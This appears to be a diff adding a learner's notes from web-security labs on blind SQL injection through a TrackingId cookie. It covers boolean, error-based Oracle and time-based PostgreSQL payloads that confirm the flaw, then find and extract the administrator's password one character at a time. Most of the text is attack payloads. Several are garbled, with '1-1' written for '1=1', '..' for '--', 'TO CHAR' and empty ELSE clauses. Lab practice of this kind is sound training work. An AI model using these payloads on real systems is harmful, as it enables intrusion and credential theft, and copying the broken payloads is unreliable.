@@ -1,0 +1,146 @@
+##Inferential SQL injection
+
+==> Boolean based(Condition response) || Time based(time delay) 
+
+<===Input parameter===>
+
+Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
+// SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
+
+/////////////////////////////////////////////////////////////////////////////////////
+#####################################################################################
+/////////////////////////////////////////////////////////////////////////////////////
+
+
+Example 1:- Blind SQL injection with conditional responses
+
+SQL CHEAT SHEET= https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+  //Default Condition
+    xyz' AND '1'='1
+    xyz' AND '1'='2
+
+1) Confirm that the parameter is vulnerable to blind SQLi
+
+select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRLVYN'
+
+-> If this tracking id exists -> query returns value-> Welcome back message 
+-> If the tracking id doesn't exist -> query returns nothing -> no Welcome bac message
+
+    select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRLVYN' and 1-1-' 
+        -> TRUE -> Welcome back
+    select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRLVYN' and 1-0--' 
+        -> FALSE -> no Welcome back
+
+
+2) Confirm that we have a users table
+    select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRLVYN' and (select 'x' from users 
+    LIMIT 1)='x'--' 
+        -> users table exists in the database.
+
+
+3) Confirm that username administrator exists users table
+    select tracking-id from tracking-table where tracking Id = 'RvLfBu6s9EZRLVYN' and (select username from    
+    users where username='administrator')='administrator'--'
+
+4) Enumerate the password of the administrator user
+    
+    select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRLVYN' and (select username from 
+    users where username='administrator' and LENGTH (password)>20)='administrator'..'
+        -> password is exactly 20 characters
+
+    select-tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRLVYN' and (select substring 
+    (password,1,1) from users where username='administrator') ='a'--'
+
+
+/////////////////////////////////////////////////////////////////////////////////////
+#####################################################################################
+/////////////////////////////////////////////////////////////////////////////////////
+
+Example 2:- Blind SQL injection with conditional error
+
+SQL CHEAT SHEET= https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+      //Default Condition
+        xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
+        xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
+
+1) Confirm that the parameter is vulnerable to blind SQLi
+
+-> select tracking-id from tracking-table where trackingId = RvLfBu6s9EZRLVYN ' -> verify that error message come
+-> select tracking-id from tracking-table where trackingId = RvLfBu6s9EZRLVYN ''-> verify that error message dissappear
+    
+    //(in this case, the unclosed quotation mark) is having a detectable effect on the response. 
+
+TrackingId=xyz'||(SELECT '')||'                     //Normal Database query
+TrackingId=xyz'||(SELECT '' FROM dual)||'           //Oracle database query (without table name it gives you an error)
+
+
+2) Prove that parameter is vulnerable
+|| (select from dual) || ' -> oracle database
+|| (select from dualfiewjfow) || ' -> error
+
+
+3) Confirm that the users table exists in the database
+|| (select from users where rownum =1) || ' users table exists
+
+
+4) Confirm that the administrator user exists in the users database
+' || (select '' from users where username='administrator') || '
+' || (select CASE WHEN (1-0) THEN TO CHAR(1/0) ELSE END FROM dual) ||'
+' || (select CASE WHEN (1-1) THEN TO CHAR(1/0) ELSE END FROM users where username='administrator') || 
+    -> Internal server error -> administrator user exists
+' || (select CASE WHEN (1-1) THEN TO CHAR(1/0) ELSE END FROM users where username='fwefwoeijfewow') || | 
+    -> 200 response -> user does not exist in database  
+
+5) Determine length of password
+' || (select CASE WHEN (1-1) THEN TO CHAR(1/0) ELSE END FROM users where username='administrator and LENGTH (password)>19) ||
+-> 200 response at 50 -> length of password is less than 50
+-> 20 characters
+
+6) Output the administrator password
+' || (select CASE WHEN (1-1) THEN TO CHAR(1/0) ELSE END FROM users where username='administrator' and substr(password,1,1) ='a') || '
+
+
+
+
+/////////////////////////////////////////////////////////////////////////////////////
+#####################################################################################
+#####################################################################################
+#####################################################################################
+/////////////////////////////////////////////////////////////////////////////////////
+
+
+
+
+==>Time based 
+
+<===Input parameter===>
+
+Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
+// SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
+
+/////////////////////////////////////////////////////////////////////////////////////
+#####################################################################################
+/////////////////////////////////////////////////////////////////////////////////////
+
+1) Confirm that the parameter is vulnerable to blind SQLi
+
+SQL CHEAT SHEET= https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+    TrackingId=x'||pg_sleep(10)--
+
+2) Confirm that the users table exists in the database
+    ' || (select case when (1-0) then pg_sleep(10) else pg_sleep(-1) end) --
+    ' || (select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users)--
+
+    ====> got to resource pool make new concurrent and set up max. concurrent request is '1'
+    ====> attack finish goto column and select response recevide column
+
+3) Enumerate the password length
+    ' || (select case when (username='administrator' and LENGTH(password)>25) then pg_sleep (10) else pg_sleep (-1) end from users)--    
+
+4) Enumerate the administrator password 
+    ' || (select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep (10) else pg_sleep (-1) end from users)--
+
+
